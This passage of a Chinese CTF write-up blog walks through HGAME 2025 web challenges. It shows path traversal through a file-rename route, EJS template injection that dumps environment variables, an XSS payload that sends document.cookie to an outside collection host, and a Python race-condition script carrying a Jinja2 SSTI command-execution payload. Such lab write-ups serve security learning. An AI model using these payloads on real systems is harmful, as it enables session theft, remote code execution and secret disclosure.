files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="comment">// 读取失败：返回 500 状态码，渲染 mortis.ejs 模板（空文件列表）</span></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取成功：渲染 mortis.ejs 模板，传入文件列表</span></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 从请求体获取旧文件名和新文件名</span></span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="comment">// 拼接旧文件和新文件的完整路径</span></span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 校验旧文件名/新文件名是否为空</span></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;); <span class="comment">// ❌ 错误：错误信息为空</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行文件重命名</span></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="comment">// 重命名失败（如文件不存在、权限不足）：返回 500 + 错误信息</span></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;); <span class="comment">// ❌ 错误：前缀多余空格</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重命名成功：返回成功消息（❌ 错误：消息为空）</span></span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里主要就是文件重命名，还有ejs模板引擎，先分析这个rename路由实现的是文件重命名，这里拼接文件路径，可以使用..&#x2F;来跳目录，从而实现文件移动，把敏感文件移动到pubilc目录下读取，现测试一下</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228104442696.png" alt="image-20260228104442696"></p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228104522226.png" alt="image-20260228104522226"></p>
+<p>可以看到成功读取文件内容，flag一般在根目录尝试读取一下</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228104903388.png" alt="image-20260228104903388"></p>
+<p>根目录下就没有放flag，那大概率就在环境变量，代码还能实现文件覆盖，并且EJS模板文件命名为mortis，这个命名也算是出题人给的提示把，先上传一个恶意的的ejs文件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= process.<span class="property">env</span>.<span class="property">FLAG</span> %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/02/12/HGAME2025/image-20260228112435627.png" alt="image-20260228112435627"></p>
+<p>然后直接访问根目录就行</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228114600708.png" alt="image-20260228114600708"></p>
+<p>或者</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;env &gt; /app/public/1.txt&quot;</span>) %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问static&#x2F;1.txt</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228114931746.png" alt="image-20260228114931746"></p>
+<p>payload参考文章<a target="_blank" rel="noopener" href="http://www.acc1ofl4g.cn/index.php/2025/12/15/node-js-ejs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti/">Node.js EJS模板注入SSTI – Acc1oFl4g’s Blog</a></p>
+<h2 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a><strong>Level 69 MysteryMessageBoard</strong></h2><p>弱口令登入，密码是888888</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228144526517.png" alt="image-20260228144526517"></p>
+<p>&#x2F;flag路由有flag，但是需要admin权限，因此要用利用xss获取cookie，这里使用xss平台。payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;https://xs.pe/Hwd.jpg/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/12/HGAME2025/image-20260228152750422.png" alt="image-20260228152750422"></p>
+<p>这里成功获得session，访问&#x2F;flag，伪造session获得flag，这里还尝试了用服务器接收cookie</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228184613960.png" alt="image-20260228184613960"></p>
+<p>依旧可以获得session</p>
+<h2 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a><strong>Level 38475 角落</strong></h2><p>扫目录扫到了robots.txt，有个app.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">	Options Indexes</span><br><span class="line">	AllowOverride None</span><br><span class="line">	Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再根据题目提示考察的是CVE-2024-38475漏洞，读取一下app.py</p>
+<p><img src="/2026/02/12/HGAME2025/image-20260228193404105.png" alt="image-20260228193404105"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">	filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">	<span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">		f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">		message = f.read()</span><br><span class="line">		f.close()</span><br><span class="line">		<span class="keyword">return</span> message</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		status = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">	filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">	message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">	f.write(message) </span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">		show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line">		<span class="keyword">return</span> render_template_string(show)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>代码的漏洞在于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/read&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def read_message():</span><br><span class="line">	if &quot;&#123;&quot; not in readmsg():</span><br><span class="line">		show = show_msg.replace(&quot;&#123;&#123;message&#125;&#125;&quot;, readmsg())</span><br><span class="line">		return render_template_string(show)</span><br><span class="line">	return &#x27;waf!!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>两次调用了readmsg，在这就可以利用条件竞争，一个正常的payload，一个恶意的payload，这里参考大佬脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://node1.hgame.vidar.club:30593/app&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race_write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 第一次写入无害内容绕过检查</span></span><br><span class="line">        requests.post(target + <span class="string">&#x27;/send&#x27;</span>, data=&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;hello&#x27;</span>&#125;)</span><br><span class="line">        <span class="comment"># 立即覆盖为恶意payload</span></span><br><span class="line">        <span class="comment">#requests.post(target + &#x27;/send&#x27;, data=&#123;&#x27;message&#x27;: &quot;&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&#125;&#125;&quot;&#125;)</span></span><br><span class="line">        requests.post(target + <span class="string">&#x27;/send&#x27;</span>,</span><br><span class="line">                      data=&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(target + <span class="string">&#x27;/read&#x27;</span>)</span><br><span class="line">        <span class="comment">#if &#x27;bin&#x27; in r.text:  # 检查是否成功执行</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hgame&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Exploit success!&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 先初始化一个合法内容</span></span><br><span class="line">    requests.post(target + <span class="string">&#x27;/send&#x27;</span>, data=&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;hello&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动竞争写入线程</span></span><br><span class="line">    threading.Thread(target=race_write, daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动检测线程</span></span><br><span class="line">    threading.Thread(target=exploit, daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保持主线程运行</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+    </div>
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+    
+        
+
+    
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/01/28/NewStar2024-WEB-MISC/" rel="prev" title="NewStar2024-WEB-MISC">
+      <i class="fa fa-chevron-left"></i> NewStar2024-WEB-MISC
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/03/01/Hgame2026-%E9%83%A8%E5%88%86/" rel="next" title="Hgame2026(部分)">
+      Hgame2026(部分) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hakuya-Want-A-Girl-Friend"><span class="nav-number">2.1.</span> <span class="nav-text">Hakuya Want A Girl Friend</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Invest-in-hints"><span class="nav-number">2.2.</span> <span class="nav-text">Invest in hints</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-314-%E7%BA%BF%E6%80%A7%E8%B5%B0%E5%BB%8A%E4%B8%AD%E7%9A%84%E5%8F%8C%E7%94%9F%E5%AE%9E%E4%BD%93"><span class="nav-number">2.3.</span> <span class="nav-text">Level 314 线性走廊中的双生实体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-729-%E6%98%93%E7%94%BB%E8%A1%8C"><span class="nav-number">2.4.</span> <span class="nav-text">Level 729 易画行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-24-Pacman"><span class="nav-number">3.1.</span> <span class="nav-text">Level 24 Pacman</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-47-BandBomb"><span class="nav-number">3.2.</span> <span class="nav-text">Level 47 BandBomb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-69-MysteryMessageBoard"><span class="nav-number">3.3.</span> <span class="nav-text">Level 69 MysteryMessageBoard</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-38475-%E8%A7%92%E8%90%BD"><span class="nav-number">3.4.</span> <span class="nav-text">Level 38475 角落</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">程序元</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程序元</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">211k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:12</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
